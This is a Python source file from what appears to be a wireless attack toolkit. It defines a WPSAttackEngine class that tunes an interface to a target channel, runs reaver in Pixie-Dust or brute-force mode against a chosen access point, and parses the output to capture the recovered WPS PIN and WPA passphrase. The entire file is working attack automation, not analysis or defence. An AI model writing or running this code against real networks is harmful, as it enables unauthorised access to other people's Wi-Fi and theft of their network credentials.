# core/attacks/wps_attack.py
import subprocess
import threading
import re

class WPSAttackEngine:
    def __init__(self, interface, bssid, channel, on_log_callback, on_success_callback, mode="pixie"):
        self.interface = interface
        self.bssid = bssid
        self.channel = str(channel)
        self.on_log = on_log_callback
        self.on_success = on_success_callback
        self.mode = mode
        self.process = None
        self.running = False

    def start(self):
        self.running = True
        self.on_log(f"[*] Locking interface {self.interface} to channel {self.channel}...")
        subprocess.run(["iw", "dev", self.interface, "set", "channel", self.channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        attack_name = "Pixie-Dust" if self.mode == "pixie" else "Brute-Force"
        self.on_log(f"[*] Firing {attack_name} attack on {self.bssid}...")
        self.thread = threading.Thread(target=self._attack_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()
            self.process.wait()
        self.on_log("[!] WPS Attack aborted.")

    def _attack_loop(self):
        cmd = ["reaver", "-i", self.interface, "-b", self.bssid, "-c", self.channel, "-vv"]
        if self.mode == "pixie":
            cmd.append("-K")
            cmd.append("1")
            
        try:
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in self.process.stdout:
                if not self.running: break
                clean_line = line.strip()
                if clean_line: self.on_log(clean_line)
                if "WPS PIN:" in line:
                    match = re.search(r"WPS PIN:\s*'([^']*)'", line)
                    if match: self.on_success("pin", match.group(1))
                if "WPA PSK:" in line:
                    match = re.search(r"WPA PSK:\s*'([^']*)'", line)
                    if match:
                        self.on_success("psk", match.group(1))
                        self.running = False
                        break
        except Exception as e:
            self.on_log(f"[-] Attack error: {e}")
        finally:
            if self.process and self.process.poll() is None:
                self.process.terminate()
